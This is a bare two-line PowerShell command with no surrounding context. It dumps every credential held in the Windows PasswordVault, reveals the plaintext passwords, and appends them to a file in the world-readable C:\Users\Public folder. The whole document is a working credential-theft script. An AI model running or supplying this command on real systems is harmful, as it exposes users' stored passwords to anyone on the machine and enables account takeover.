[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
(new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ } >> C:\Users\Public\passwords.txt
